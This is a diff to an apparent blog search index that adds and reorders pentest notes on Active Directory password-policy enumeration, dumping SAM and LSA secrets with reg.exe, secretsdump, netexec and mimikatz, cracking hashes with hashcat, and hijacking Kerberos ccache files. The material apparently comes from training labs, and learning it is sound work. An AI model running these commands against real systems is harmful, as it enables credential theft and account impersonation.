@@ -521,6 +521,73 @@
       </tags>
   </entry>
   <entry>
+    <title>Enumerating &amp; Retrieving Password Policies</title>
+    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-enum4linux-ng"><a href="#Using-enum4linux-ng" class="headerlink" title="Using enum4linux-ng"></a>Using enum4linux-ng</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="LDAP-Anonymous-Bind"><a href="#LDAP-Anonymous-Bind" class="headerlink" title="LDAP Anonymous Bind"></a>LDAP Anonymous Bind</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -h 172.16.5.5 -x -b <span class="string">&quot;DC=INLANEFREIGHT,DC=LOCAL&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Enumeration</category>
+        <category>Passwords</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux Credential Hunting</title>
     <url>/2025/11/27/Linux-Credential-Hunting/</url>
     <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
@@ -592,45 +659,6 @@
         <tag>browser-credentials</tag>
         <tag>LaZagne</tag>
         <tag>Mimipenguin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-SAM</tag>
       </tags>
   </entry>
   <entry>
@@ -871,38 +899,6 @@
         <tag>Exploitation</tag>
         <tag>MySQL-Read-Files</tag>
         <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PTT : Abusing KeyTab ccache</title>
-    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
-    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
-<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
-
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab Ccache Abuse</category>
-      </categories>
-      <tags>
-        <tag>klist</tag>
-        <tag>ccache</tag>
       </tags>
   </entry>
   <entry>
@@ -1152,6 +1148,38 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PTT : Abusing KeyTab ccache</title>
+    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
+    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
+<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Ccache Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>ccache</tag>
       </tags>
   </entry>
   <entry>
